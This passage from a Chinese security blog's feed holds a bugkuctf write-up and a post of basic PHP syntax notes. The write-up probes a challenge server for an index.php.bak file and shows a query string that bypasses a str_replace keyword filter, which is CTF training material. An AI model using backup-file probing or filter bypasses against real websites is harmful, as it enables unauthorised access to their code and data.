<span class="keyword">echo</span> <span class="string">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;hello '</span>.$_SESSION[<span class="string">'username'</span>].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        info = <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;username,<span class="string">'password'</span>=&gt;password);</span><br><span class="line">        login(info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;body class="login-body"&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                &lt;div id="wrapper"&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="user-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="pass-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="header"&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="content"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="footer"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type="submit" name="submit" value="Login" class="button" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h1><p>根据以前做题的经验， 备份就是在提示你 存在bak文件<br>所以直接输入URL为 <code>http://123.206.87.240:8002/web16/index.php.bak</code> 然后下载文件<br>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>做代码审计的题目， 还是主要靠自己尝试。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$str"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$str = substr($str, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$str"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>, $str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$str"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">parse_str($str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$key1"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面是我用来测试的代码</p><p>构造URL为 <code>http://localhost/test/test.php?kkeyey1=1&amp;kkeyey2=2</code><br>输出了这些：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?kkeyey1=1&amp;kkeyey2=2</span><br><span class="line">kkeyey1=1&amp;kkeyey2=2</span><br><span class="line">key1=1&amp;key2=2</span><br><span class="line">1</span><br><span class="line">c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line">c81e728d9d4c2f636f067f89cc14862c</span><br></pre></td></tr></table></figure></p><p>之前还很疑惑为什么没有get都能得到变量， 原来是<code>parse_str</code>这个函数在起作用。</p><p>OK， 现在就是表演的时间了。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/wy_97/article/details/77431111" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/77431111</a><br><a href="https://www.cnblogs.com/Pinging/p/8278168.html" target="_blank" rel="noopener">https://www.cnblogs.com/Pinging/p/8278168.html</a><br><a href="https://blog.csdn.net/qq_19861715/article/details/79384018" target="_blank" rel="noopener">https://blog.csdn.net/qq_19861715/article/details/79384018</a></p><p><a href="https://blog.csdn.net/qq_39629343/article/details/80696263" target="_blank" rel="noopener">https://blog.csdn.net/qq_39629343/article/details/80696263</a></p><p><a href="https://www.jianshu.com/p/b0a5d72c8bae" target="_blank" rel="noopener">秋名山老司机</a><br><a href="https://blog.csdn.net/qq_26090065/article/details/81588595" target="_blank" rel="noopener">cookie欺骗</a><br><a href="https://blog.csdn.net/csu_vc/article/details/79619309" target="_blank" rel="noopener">CBC字节翻转攻击</a></p><p><a href="https://www.cnblogs.com/EvileOn/p/5517235.html" target="_blank" rel="noopener">python requests库学习</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;一直想把自己做过的bugkuctf题目汇个总， 现在终于腾出时间来啦！&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="bugkuctf" scheme="https://prontosil.club/categories/bugkuctf/"/>
    
    
      <category term="代码审计，wp" scheme="https://prontosil.club/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%8Cwp/"/>
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
      <category term="MD5" scheme="https://prontosil.club/tags/MD5/"/>
    
  </entry>
  
  <entry>
    <title>PHP语法摘录</title>
    <link href="https://prontosil.club/2019/02/07/PHP%E8%AF%AD%E6%B3%95%E6%91%98%E5%BD%95/"/>
    <id>https://prontosil.club/2019/02/07/PHP语法摘录/</id>
    <published>2019-02-07T07:14:52.000Z</published>
    <updated>2019-02-07T07:16:33.267Z</updated>
    
    <content type="html"><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>最近在复习PHP的语法， 毕竟代码审计这方面还是比较弱。 过年的这几天也提不上学习的动力， 就只好不断地更新自己的博客比较好了</p><a id="more"></a><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br><span class="line">echo &quot;I like &quot; . $cars[0] . &quot;, &quot; . $cars[1] . &quot; and &quot; . $cars[2] . &quot;.&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>. 拼接字符串</p><p>PHP大致有三种类型的数组</p><ul><li>数值数组， 和C语言的数组很相似， 键值默认从0开始</li><li>关联数组， 相当于python中的dict类型</li><li>多维数组</li></ul><p>涉及到几个函数</p><h5 id="获取数组的长度-count-函数"><a href="#获取数组的长度-count-函数" class="headerlink" title="获取数组的长度-count()函数"></a>获取数组的长度-count()函数</h5><h5 id="遍历数值数组"><a href="#遍历数值数组" class="headerlink" title="遍历数值数组"></a>遍历数值数组</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br><span class="line">$arrlength=count($cars);</span><br><span class="line"> </span><br><span class="line">for($x=0;$x&lt;$arrlength;$x++)</span><br><span class="line">&#123;</span><br><span class="line">    echo $cars[$x];</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="遍历关联数组"><a href="#遍历关联数组" class="headerlink" title="遍历关联数组"></a>遍历关联数组</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);</span><br><span class="line"> </span><br><span class="line">foreach($age as $x=&gt;$x_value)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Key=&quot; . $x . &quot;, Value=&quot; . $x_value;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h4><p>实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 二维数组:</span><br><span class="line">$cars = array</span><br><span class="line">(</span><br><span class="line">    array(&quot;Volvo&quot;,100,96),</span><br><span class="line">    array(&quot;BMW&quot;,60,59),</span><br><span class="line">    array(&quot;Toyota&quot;,110,100)</span><br><span class="line">);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><hr><h4 id="几个函数的区别"><a href="#几个函数的区别" class="headerlink" title="几个函数的区别"></a>几个函数的区别</h4><h5 id="echo函数"><a href="#echo函数" class="headerlink" title="echo函数"></a>echo函数</h5><p>可以一次输出多个值， echo是语言结构， 并不是真正的函数</p><h5 id="print"><a href="#print" class="headerlink" title="print()"></a>print()</h5><p>打印一个值， 打印成功返回true， 打印失败返回false</p><h5 id="print-r"><a href="#print-r" class="headerlink" title="print_r()"></a>print_r()</h5><p>可以把字符串和数字简单地打印出来，而数组则以括起来的键和值得列表形式显示，并以Array开头。但print_r()输出布尔值和NULL的结果没有意义，因为都是打印”\n”。因此用var_dump()函数更适合调试。</p><h6 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h6><p>判断一个变量的类型与长度,并输出变量的数值,如果变量有值输的是变量的值并回返数据类型。此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p><h4 id="PHP-Cookie"><a href="#PHP-Cookie" class="headerlink" title="PHP Cookie"></a>PHP Cookie</h4><p>我的理解： client在请求的时候， server 端会 通过 setcookie函数 将一些键值对发送给 client端， 之后 client端 再去访问的时候就会带上 cookie</p><h5 id="如何创建cookie"><a href="#如何创建cookie" class="headerlink" title="如何创建cookie"></a>如何创建cookie</h5><p>setcookie() 函数用于设置 cookie。</p><p><strong>注释</strong>：setcookie() 函数必须位于 <html> 标签之前。</html></p><p>创建一个名字为 “user” 的cookie， 并赋值为 “runoob”, 并规定cookie在一小时后失效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;user&quot;, &quot;runoob&quot;, time()+3600);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><strong>注释</strong>：在发送 cookie 时，cookie 的值会自动进行 URL 编码，在取回时进行自动解码。（为防止 URL 编码，请使用 setrawcookie() 取而代之。）</p><h5 id="获得cookie的值"><a href="#获得cookie的值" class="headerlink" title="获得cookie的值"></a>获得cookie的值</h5><p>PHP 的 $_COOKIE 变量用于取回 cookie 的值。</p><p>在下面的实例中，我们取回了名为 “user” 的 cookie 的值，并把它显示在了页面上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 输出 cookie 值</span><br><span class="line">echo $_COOKIE[&quot;user&quot;];</span><br><span class="line"></span><br><span class="line">// 查看所有 cookie</span><br><span class="line">print_r($_COOKIE);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>可以使用 <code>isset()</code>函数来确定是否这是了cookie</p><h5 id="如何删除cookie"><a href="#如何删除cookie" class="headerlink" title="如何删除cookie"></a>如何删除cookie</h5><p>将cookie失效的时间改成过去的时间点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 设置 cookie 过期时间为过去 1 小时</span><br><span class="line">setcookie(&quot;user&quot;, &quot;&quot;, time()-3600);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h4 id="PHP-session"><a href="#PHP-session" class="headerlink" title="PHP session"></a>PHP session</h4><p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p><h5 id="开始PHP-session"><a href="#开始PHP-session" class="headerlink" title="开始PHP session"></a>开始PHP session</h5><p>首先必须启动会话</p><p><code>session_start()</code>函数必须位于<html>标签之前<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php session_start(); ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></html></p><h5 id="存储session变量"><a href="#存储session变量" class="headerlink" title="存储session变量"></a>存储session变量</h5><p>存储和取回 session 变量的正确方法是使用 PHP $_SESSION 变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">// 存储 session 数据</span><br><span class="line">$_SESSION[&apos;views&apos;]=1;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h5 id="创建一个简单地page-view计数器"><a href="#创建一个简单地page-view计数器" class="headerlink" title="创建一个简单地page-view计数器"></a>创建一个简单地page-view计数器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">if(isset($_SESSION[&apos;views&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $_SESSION[&apos;views&apos;]=$_SESSION[&apos;views&apos;]+1;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    $_SESSION[&apos;views&apos;]=1;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;浏览量：&quot;. $_SESSION[&apos;views&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="销毁session"><a href="#销毁session" class="headerlink" title="销毁session"></a>销毁session</h5><p>unset() 函数用于释放指定的 session 变量</p><p>通过调用 session_destroy() 函数彻底销毁 session</p><h4 id="PHP过滤器简介"><a href="#PHP过滤器简介" class="headerlink" title="PHP过滤器简介"></a>PHP过滤器简介</h4><p>常见的过滤器函数</p><ul><li>filter_var() - 通过一个指定的过滤器来过滤单一的变量</li><li>filter_var_array() - 通过相同的或不同的过滤器来过滤多个变量</li><li>filter_input() - 获取一个输入变量，并对它进行过滤</li><li>filter_input_array() - 获取多个输入变量，并通过相同的或不同的过滤器对它们进行过滤</li></ul><p>示例1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$int = 123;</span><br><span class="line"> </span><br><span class="line">if(!filter_var($int, FILTER_VALIDATE_INT))</span><br><span class="line">&#123;</span><br><span class="line">    echo(&quot;不是一个合法的整数&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo(&quot;是个合法的整数&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h5 id="options"><a href="#options" class="headerlink" title="options"></a>options</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$var=300;</span><br><span class="line"> </span><br><span class="line">$int_options = array(</span><br><span class="line">    &quot;options&quot;=&gt;array</span><br><span class="line">    (</span><br><span class="line">        &quot;min_range&quot;=&gt;0,</span><br><span class="line">        &quot;max_range&quot;=&gt;256</span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line">if(!filter_var($var, FILTER_VALIDATE_INT, $int_options))</span><br><span class="line">&#123;</span><br><span class="line">    echo(&quot;不是一个合法的整数&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo(&quot;是个合法的整数&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="过滤多个输入"><a href="#过滤多个输入" class="headerlink" title="过滤多个输入"></a>过滤多个输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filters = array</span><br><span class="line">(</span><br><span class="line">    &quot;name&quot; =&gt; array</span><br><span class="line">    (</span><br><span class="line">        &quot;filter&quot;=&gt;FILTER_SANITIZE_STRING</span><br><span class="line">    ),</span><br><span class="line">    &quot;age&quot; =&gt; array</span><br><span class="line">    (</span><br><span class="line">        &quot;filter&quot;=&gt;FILTER_VALIDATE_INT,</span><br><span class="line">        &quot;options&quot;=&gt;array</span><br><span class="line">        (</span><br><span class="line">            &quot;min_range&quot;=&gt;1,</span><br><span class="line">            &quot;max_range&quot;=&gt;120</span><br><span class="line">        )</span><br><span class="line">    ),</span><br><span class="line">    &quot;email&quot;=&gt; FILTER_VALIDATE_EMAIL</span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line">$result = filter_input_array(INPUT_GET, $filters);</span><br><span class="line"> </span><br><span class="line">if (!$result[&quot;age&quot;])</span><br><span class="line">&#123;</span><br><span class="line">    echo(&quot;年龄必须在 1 到 120 之间。&lt;br&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">elseif(!$result[&quot;email&quot;])</span><br><span class="line">&#123;</span><br><span class="line">    echo(&quot;E-Mail 不合法&lt;br&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo(&quot;输入正确&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="关于form表单"><a href="#关于form表单" class="headerlink" title="关于form表单"></a>关于form表单</h4><h5 id="form表单的四种属性"><a href="#form表单的四种属性" class="headerlink" title="form表单的四种属性"></a>form表单的四种属性</h5><blockquote><ul><li>action : url 地址， 服务器接收表单数据的地址</li><li>method : 提交服务器的http方法，一般为post或者get</li><li>name：</li><li>enctype: 表单数据提交使用的编码类型， 默认使用 “application/x-www-form-urlencoded”  如果使用的是post请求，则请求头中的 <code>content-type</code> 指定值就是改值。 如果表单中有上传文件， 编码类型需要使用 <code>multipart/form-data</code> 类型才能完成传递文件数据</li></ul></blockquote><h5 id="浏览器提交表单时执行的步骤"><a href="#浏览器提交表单时执行的步骤" class="headerlink" title="浏览器提交表单时执行的步骤"></a>浏览器提交表单时执行的步骤</h5><blockquote><p>1、识别出表单中表单元素的有效项，作为提交项<br>2、构建一个表单数据集<br>3、根据form表单中的enctype属性的值作为content-type对数据进行编码<br>4、根据form表单中的action属性和method属性向指定的地址发送数据</p></blockquote><h5 id="四种常见的post请求提交数据的方式"><a href="#四种常见的post请求提交数据的方式" class="headerlink" title="四种常见的post请求提交数据的方式"></a>四种常见的post请求提交数据的方式</h5><p>1.application/x-www-form-urlencoded<br>2.multipart/form-data<br>3.application/json<br>4.text/xml</p><hr><p>总算沉下心来花时间把这些东西整理了一下。 PHP， form， http， 这几样东西其实本身是联系在一起的， 可能之前学习的时候把它们忽视掉了。</p><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="http://www.runoob.com/php/php-tutorial.html" target="_blank" rel="noopener">菜鸟教程</a><br><a href="https://www.cnblogs.com/tylerdonet/p/3702527.html" target="_blank" rel="noopener">echo, print(), print_r(), var_dump()的区别</a><br><a href="http://www.runoob.com/try/showphp.php?filename=demo_array_multi" target="_blank" rel="noopener">多维数组示例</a><br><a href="https://blog.csdn.net/bigtree_3721/article/details/82809459" target="_blank" rel="noopener">Form表单、四种常见的POST请求提交数据方式</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h4&gt;&lt;p&gt;最近在复习PHP的语法， 毕竟代码审计这方面还是比较弱。 过年的这几天也提不上学习的动力， 就只好不断地更新自己的博客比较好了&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>博客摘录</title>
    <link href="https://prontosil.club/2019/02/05/%E5%8D%9A%E5%AE%A2%E6%91%98%E5%BD%95/"/>
    <id>https://prontosil.club/2019/02/05/博客摘录/</id>
    <published>2019-02-05T13:08:18.000Z</published>
    <updated>2019-02-05T13:14:46.160Z</updated>
    
